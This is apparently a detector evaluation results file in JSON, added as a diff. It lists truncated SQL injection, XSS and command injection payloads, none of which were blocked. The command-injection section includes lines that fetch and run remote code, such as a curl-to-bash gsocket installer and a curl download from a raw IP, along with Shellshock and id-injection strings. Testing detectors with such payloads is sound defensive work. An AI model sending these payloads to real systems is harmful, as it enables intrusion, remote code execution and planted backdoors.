@@ -1,0 +1,632 @@
+{
+  "sqli": {
+    "total": 40,
+    "blocked": 0,
+    "statusCounts": {
+      "200": 40
+    },
+    "classCounts": {},
+    "rows": [
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/;/plugins/user-registration/assets/js/frontend"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/wp-includes/js/mediaelement+where+0+in+(select+sleep(15)+)+--+"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/)/wp-content/uploads/2020/04/6b2fa1b9-c963-3881-90e3-4f13ffe1c2d3.jpg"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "1 where 6040=6040 and 9660=(select count(*) from all_users t1,all_users t2,all_u"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php'+AND+'1'='1'+--+/2020/04/04/vero-nihil-nam-numquam-ullam-quas"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/'\"/tag/nihil-ut-deleniti-est/feed"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "p=1\"+and+elt++(++4249++=++4249,7259++)++"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "-2495)) as hudw where 4197=4197 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)|"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php/2020%')+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL#/03/"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php/2020/03))+UNION+ALL+SELECT+NULL,NULL,NULL,NULL--+-/27"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "ver=4.9.5"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php%')+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/wp-content/uploads/2020/04/cropped-587d69f7-b2e2-363b-b76a-5fd0bcf0c834-1-"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "c=0&dir=ltr&load[]=dashicons,buttons,forms,l10n,login&ver=4.9.5\"+AND+\"1\"=\"1\"+--+"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php/tag/sapiente-blanditiis-quasi/feed\""
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/feed'+UNION+ALL+S"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php/2020/03+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "ver=3.7.3"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "1%\"))) union all select null,null,null,null,null--"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog'))+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/ind"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog'+AND+'1'='1'+--+/index.php/author/vbechtelar"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog'+UNION+ALL+SELECT+NULL#/index.php/2020/03"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/'\"/about.php"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "reauth=1\"+where+0+in+(select+sleep(15)+)+--+&redirect_to=http://test-site.com/bl"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/wp-includes/js/jquery+AND+1=1+--+"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php/2020/03')+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NU"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "username=crummyBittern9&password=He*Ta-&user-registration-login-nonce=6eac0e2d5f"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "p=\"))/**/As/**/pXhW/**/wHere/**/8900=8900/**/Or/**/CHar(98)||CHar(68)||CHar(118)"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php/2020/03/29\"+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/wp-content/uploads/2020\"+and+0+in+(select+sleep(15)+)+--+/04/ca053e21-2e95"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php/2020'))+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php\"+or+0+in+(select+sleep(15)+)+--+/2020/03"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php%')+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-/"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "profile-pic-url=&profile-default-image=http://1.gravatar.com/avatar/14d5b5665405"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/wp-content/uploads/2020/04&sleep$mc+15&/7c651b11-3631-3f9e-b728-dc11efe811"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia%')+UNION+ALL+SELEC"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog\"+and+0+in+(select+sleep(15)+)+--+/wp-content/uploads/2020"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php/my-account/edit-profile%22+where+0+in+%28select+sleep%2815%29+%2"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/wp-content/themes\"+and+0+in+(select+sleep(15)+)+--+/twentyseventeen/assets"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog%'+UNION+ALL+SELECT+NULL,NULL,NULL#/index.php/2020/03/27"
+      }
+    ]
+  },
+  "xss": {
+    "total": 40,
+    "blocked": 0,
+    "statusCounts": {
+      "200": 40
+    },
+    "classCounts": {},
+    "rows": [
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101)."
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "<div draggable=\"true\" contenteditable>drag me</div><content ondrop=alert(1) cont"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "comment=&submit=Post+Comment&comment_post_ID=56&comment_parent=0"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/wp-content/uploads/2020/\";print(chr(122).chr(97).chr(112).chr(95).chr(116)"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "<script>+-+-1-+-+alert(1)</script>"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "<noscript onpaste=\"alert(1)\" contenteditable>test</noscript>"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "<rtc onmouseout=\"alert(1)\">test</rtc>"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "ver=1.8.2.1"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "section=&amp;from=hp-firsttime-headersearch&amp;query=\">'><script>alert(12345)</"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "q=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "modo=registro&login=willy&password=c53p7t25064&nombre=%3cscript%3ealert%28%22par"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "id=treaty&amp;lang=en\"><script>alert(document.cookie)</script>"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "<code id=x tabindex=1 onbeforedeactivate=alert(1)></code><input autofocus>"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "activedoc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "option=com_content&amp;user_rating=1&amp;submit_vote=評価&amp;task=vote&amp;pop=0&"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "<br onfocusout=alert(1) tabindex=1 id=x></br><input autofocus>"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "rid=file:\ncontent-type: text/html;charset=utf-7\n\n+adw-script+ad4-alert('xss');+a"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php/2020/04/';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(1"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "chkcategory=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101)."
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/;print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).ch"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php/my-account/edit-profile/\";print(chr(122).chr(97).chr(112).chr(95"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/wp-content/themes/twentyseventeen/assets/images/';print(chr(122).chr(97).c"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "<area draggable=\"true\" ondragleave=\"alert(1)\">test</area>"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "<object onfocusout=alert(1) tabindex=1 id=x></object><input autofocus>"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/d_8992be70/description_en.html"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "task=search&amp;domain=warez.sg&amp;s=d98cb5b1e81a8934b3fb&amp;tb=0&amp;a_id=2&a"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "harf=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1&gt;hacked by tre"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "<audio/**/onloadstart='(_=/**/confirm/**/(1))'/src><!--renwax23"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "tab=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--&quot;&a"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "pageid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "<div draggable=\"true\" contenteditable>drag me</div><rb ondragover=alert(1) conte"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php/2020/\";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111)"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php/category/;print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(1"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php/2020/04/04/\";print(chr(122).chr(97).chr(112).chr(95).chr(116).ch"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/blog/index.php/my-account/edit-profile/${@print(chr(122).chr(97).chr(112).chr(9"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "v=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&g"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/wp-comments-post.php"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "<q onclick=\"alert(1)\">test</q>"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "<s onbeforecut=\"alert(1)\" contenteditable>test</s>"
+      }
+    ]
+  },
+  "cmdi": {
+    "total": 40,
+    "blocked": 0,
+    "statusCounts": {
+      "200": 40
+    },
+    "classCounts": {},
+    "rows": [
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "route"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "ver=1.8.2.1\nsleep+15\n"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "username=rafael\";sleep+15;\"&password=españa01&user-registration-login-nonce=6eac"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "ver=${629334+822400}"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "cmd=bash -c \"$(curl -fsSL https://gsocket.io/y)\""
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "<?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(\""
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "<?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(\""
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "username=goofyDunbird5&password=JIDtUXzU&user-registration-login-nonce=6eac0e2d5"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "ver=${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(10"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/wp-includesSimplePiegzdecodes.php"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "ver=4.9.5&&sleep+15"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/d_1b0ce567/d_b721959b/d_6bc96a7f/d_47b69ecf"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "profile-pic-url=&profile-default-image=http://1.gravatar.com/avatar/14d5b5665405"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "a|/usr/bin/id"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "ver=4.9.5'&sleep+15&'"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "comment=\"&sleep+15&\"&submit=Post+Comment&comment_post_ID=56&comment_parent=0"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "cmd=bash -c \"$(curl -fsSL https://gsocket.io/y)\""
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/wp-comments-post.php"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "username=bubblySardines2&password=I#mGM&user-registration-login-nonce=6eac0e2d5f"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "Fox=d3wL7"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "ver=4.9.5&sleep+15&"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "cmd=bash -c \"$(curl -fsSL https://gsocket.io/y)\""
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/d_3b7452da/d_79190768/d_400d3b87/d_400d3b87/d_6f3926dd/d_00df4609/d_e8180e2f/ev"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "<?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(\""
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "username=rafael&password=españa01&&sleep+15&user-registration-login-nonce=6eac0e"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "ver=${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(10"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "username=morbidCoconut9&password=()+{+:;};+/bin/sleep+15&user-registration-login"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "cmd=bash -c \"$(curl -fsSL https://gsocket.io/y)\""
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "ver=()+{+:;};+echo+'X-Powered-By:+ShellShock-Vulnerable'"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "username=aloofJaguar5&password=v$mXF&user-registration-login-nonce=6eac0e2d5f&_w"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "\\nid|"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "a);id;"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "exec=bash -c \"$(curl -fsSL https://gsocket.io/y)\""
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/d_3b1ec613/d_bd205cb5/gzdecodes.php"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "<?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(\""
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "Section=NoAuthREQ&Action=x509List&type=*\";cd /tmp;curl -O http://5.206.227.228/z"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "/d_3c2c4656/d_6bf783eb"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "%ADd+cgi.force_redirect%3D0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "first_name=ZAP&user_login=mercifulDunbird8&user_pass=ZAP&user_confirm_password=j"
+      },
+      {
+        "status": 200,
+        "predictedClass": null,
+        "payloadPreview": "rsd=||sleep+15"
+      }
+    ]
+  }
+}
